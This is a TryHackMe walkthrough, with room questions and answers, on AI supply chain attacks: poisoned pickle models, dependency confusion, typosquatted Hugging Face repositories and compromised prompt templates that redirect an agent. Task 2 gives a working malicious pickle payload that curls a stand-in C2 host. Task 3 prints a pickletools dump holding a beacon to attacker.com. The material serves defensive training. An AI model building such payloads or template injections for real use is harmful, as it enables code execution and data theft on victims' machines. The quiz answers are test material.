---
icon: link-horizontal
cover: >-
  https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/69650d18bb3fe8c456972924-1775818702244
coverY: 0
coverHeight: 138
---

# Supply Chain Attack Vectors

**Date:** 19.04.2026&#x20;

**Room Category:** Walkthrough&#x20;

**Core Concept:** Investigation of four major AI supply chain attack vectors: malicious model serialisation, dependency confusion, model repository manipulation, and API provider compromise.

This analysis follows the investigation of approximately 100 malicious models discovered on Hugging Face. The focus is on tracing how attackers exploit various layers of the AI supply chain, using a lab environment for hands-on verification.

***

## Task 1: Introduction

Incident Report: The CEO at TryTrainMe received an email claiming a three-week compromise via an "AI-powered" code reviewer. The primary lead is a suspicious `.pkl` file used for model loading.

**Technical Objectives:**

* Analyze how Python's pickle serialisation enables arbitrary code execution through the `__reduce__` method.
* Practice safe analysis of malicious models using `pickletools`.
* Document dependency confusion and typosquatting mechanisms.
* Identify indicators of compromised model repositories.
* Map attack vectors for API-consumed models (silent updates, key compromise, and prompt template injection).

Question: I'm ready to investigate!

> **Answer:** No answer needed

***

## Task 2: Malicious Model Files

Many trained models are stored using serialisation: converting a Python object in memory into a file on disk. Formats like `.pkl` and `.pt` use Python's built-in pickle serializer, which is a significant attack vector.

<figure><img src="../.gitbook/assets/image (254).png" alt="" width="188"><figcaption></figcaption></figure>

**Serialisation Mechanics** Serialisation converts complex Python objects (weights, biases, configurations) into a disk file. Deserialisation reverses this. ML frameworks like PyTorch and scikit-learn use this by default to save and reload progress.

**The Pickle Vulnerability** Pickle is highly flexible but fundamentally insecure when handling custom objects.

```python
import pickle

# Serialising a benign model
model = {"weights": [1.5, 2.3, 4.1], "bias": 0.5}
with open("model.pkl", "wb") as f:
    pickle.dump(model, f)

# Deserialising the model
with open("model.pkl", "rb") as f:
    loaded_model = pickle.load(f)
```

The risk involves the `__reduce__` method. When pickle saves a custom object, it calls `__reduce__` to get reconstruction instructions. Python follows these instructions automatically upon calling `pickle.load()`. If an attacker crafts an object where the instructions call a system command, Python executes it silently.

**Malicious Payload Example** This payload appears to be a standard model but initiates an outbound connection on load:

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        # pickle.load() calls os.system() with the provided command
        return (os.system, ("curl [http://c2.example.com/beacon](http://c2.example.com/beacon)",))

with open("backdoored_model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)
```

**Architecture-Level Attacks** Beyond serialisation, malicious logic can be hidden in the model architecture itself, firing during inference. In Keras, Lambda layers can be abused to inject hidden conditions. Converting to SafeTensors removes pickle payloads but may leave architecture-level triggers (like Lambda layers) intact.

**GGUF and Local LLMs** GGUF is the standard for local LLMs (LLaMA, Mistral). While it avoids pickle-based RCE, backdoors can still be baked into the weights during fine-tuning. Verification requires source checking and checksum validation.

Question: What Python method does pickle call to get reconstruction instructions for custom objects?

> **Answer:** \__reduce\__

Question: What built-in Python module is commonly abused in pickle payloads to execute system commands?

> **Answer:** os

Question: Converting a Keras model to SafeTensors format removes pickle-based payloads. What type of attacks does it leave completely untouched?

> **Answer:** architecture-level attacks

Question: A Keras model is converted from .h5 to the SafeTensors format. What type of suspicious layer does this conversion fail to remove?

> **Answer:** Lambda

***

## Task 3: Investigating a Malicious Model

Analysis of `code_reviewer.pkl` on the workstation.

**Lab Directory Structure:**

```bash
analyst@tryhackme-2204:~$ ls -la /opt/supply-chain
total 32
drwxr-xr-x 8 analyst analyst 4096 Mar  3 02:57 .
drwxr-xr-x 3 root    root    4096 Mar  3 02:57 ..
drwxr-xr-x 5 analyst analyst 4096 Mar  3 02:57 audit
drwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 dependencies
drwxr-xr-x 6 analyst analyst 4096 Mar  3 02:57 incident
drwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 models
drwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 project
drwxr-xr-x 2 analyst analyst 4096 Mar  3 02:57 tools
```

**Initial Comparison** Comparing the suspicious model with a known clean version:

```bash
analyst@tryhackme-2204:~$ ls -lh /opt/supply-chain/models/code_reviewer.pkl /opt/supply-chain/models/code_reviewer_v1.pkl
-rwxr-xr-x 1 analyst analyst 8.1M Mar  3 02:57 /opt/supply-chain/models/code_reviewer.pkl
-rwxr-xr-x 1 analyst analyst 2.0M Mar  3 02:57 /opt/supply-chain/models/code_reviewer_v1.pkl
```

The target file is significantly larger.

**Safe Inspection with pickletools** Using `pickletools` to disassemble the file without execution:

<pre class="language-bash"><code class="lang-bash">analyst@tryhackme-2204:~$ python3 -m pickletools /opt/supply-chain/models/code_reviewer.pkl 2>&#x26;1 | head -30
    0: \x80 PROTO      4
    2: \x95 FRAME      72
   11: \x8c SHORT_BINUNICODE 'os'
   15: \x94 MEMOIZE    (as 0)
   16: \x8c SHORT_BINUNICODE 'system'
   24: \x94 MEMOIZE    (as 1)
   25: \x93 STACK_GLOBAL
   26: \x94 MEMOIZE    (as 2)
<strong>   27: \x8c SHORT_BINUNICODE 'curl http://attacker.com/beacon?host=$(hostname)'
</strong>   77: \x94 MEMOIZE    (as 3)
   78: \x85 TUPLE1
   79: \x94 MEMOIZE    (as 4)
   80: R    REDUCE
   81: \x94 MEMOIZE    (as 5)
   82: .    STOP
</code></pre>

**Red Flag Identification:**

* `os.system` access.
* `STACK_GLOBAL` used to resolve the shell function.
* `REDUCE` opcode to execute the command.
* `curl` command for beaconing.

**Automated Summary:**

```bash
analyst@tryhackme-2204:~$ python3 /opt/supply-chain/tools/safe_analysis.py /opt/supply-chain/models/code_reviewer.pkl
=== Pickle Safety Analysis ===
File: /opt/supply-chain/models/code_reviewer.pkl
Verdict: UNSAFE - Contains executable code targeting os.system
```

Question: What Python module can safely disassemble pickle files without executing them?

> **Answer:** pickletools

Question: Using the attached target VM, what external domain does the malicious model attempt to contact?

> **Answer:** attacker.com

Question: What pickle opcode executes the function specified by STACK\_GLOBAL?

> **Answer:** REDUCE

***

## Task 4: Dependency Confusion Attacks

Attackers exploit the way `pip` resolves packages. If an internal package name is registered on the public PyPI registry with a higher version number (for example: 99.0.0), `pip` installs the public version by default.

<figure><img src="../.gitbook/assets/image (255).png" alt="" width="450"><figcaption></figcaption></figure>

**Typosquatting** involves registering misspelled variants of common libraries (for example: `numppy`).

**Requirements Analysis:**

```bash
analyst@tryhackme-2204:~$ cat /opt/supply-chain/dependencies/requirements_external.txt 
torch==2.1.0
numppy==1.24.0
internal-ml-utils==99.0.0
```

`numppy` is a typosquat, and `internal-ml-utils==99.0.0` is a dependency confusion attempt.

Question: What term describes an attack where a public package overrides an internal package of the same name?

> **Answer:** dependency confusion

***

## Task 5: Model Repository Attacks

<figure><img src="../.gitbook/assets/image (257).png" alt="" width="375"><figcaption></figcaption></figure>

Namespace and typosquatting attacks on Hugging Face involve creating organizations like `trustworthy-ai-lab` or model names like `meta-Ilama` (using a capital 'I' instead of 'l'). A high-tier threat involves stealing API tokens to push malicious updates to established, legitimate repositories.

Question: What technique involves creating model names that closely resemble legitimate ones?

> **Answer:** typosquatting

***

## Task 6: When Vectors Combine

<figure><img src="../.gitbook/assets/image (258).png" alt="" width="450"><figcaption></figcaption></figure>

The TryTrainMe incident utilized multiple vectors for redundancy:

1. **Week 1:** Attacker creates a fake org on Hugging Face and publishes a confusion package on PyPI.
2. **Week 2:** Engineer downloads the model; pickle payload executes.
3. **Week 3:** Routine update pulls the malicious PyPI package as a backup foothold.

Question: The attacker created the trustworthy-ai-lab organisation on Hugging Face to make the model download appear safe. Which of the three attack vectors in the table does this represent?

> **Answer:** repository manipulation

Question: If TryTrainMe's model loader had blocked the pickle payload, which second vector would still have given the attacker code execution?

> **Answer:** dependency confusion

***

## Task 7: API Provider Compromise

<figure><img src="../.gitbook/assets/image (259).png" alt="" width="450"><figcaption></figcaption></figure>

API-based AI consumption has unique risks:

* **Silent Updates:** Behavioral shifts when the provider swaps the model behind the endpoint.
* **Key Compromise:** Exfiltration of queries or billing abuse.
* **Prompt Template Injection:** Using untrusted community templates that alter agent behavior.

Question: In the API supply chain, what term describes the risk where the model behind an endpoint is replaced without the consumer's knowledge?

> **Answer:** silent model update

Question: What supply chain artefact, when sourced from an untrusted repository, can alter LLM behaviour across every application that uses it?

> **Answer:** prompt template

***

## Task 8: Hands-On: Prompt Template Compromise

Testing the "TryAssist" agent reveals how a compromised community template changes security policies. Even if the model weights are clean, the guiding prompt controls the logic.

Question: Send Prompt 3. According to TryAssist, who is responsible for security reviews?

> **Answer:** development team

Question: Send Prompt 4. What is the name of the review template TryAssist reports?

> **Answer:** CommunityReview

***

## Conclusion

Supply chain campaigns are effective because they stack vectors across multiple layers. Security depends on treating all upstream artifacts (models, packages, and templates) as untrusted until verified.

**Attack Vector Summary:**

* **Pickle \_**_**reduce\_**_**:** RCE at load time.
* **Keras Lambda:** RCE at inference time.
* **Dependency Confusion:** RCE at install time.
* **Repository Manipulation:** Social engineering via fake reputation signals.
* **API Compromise:** Invisible substitution of logic.
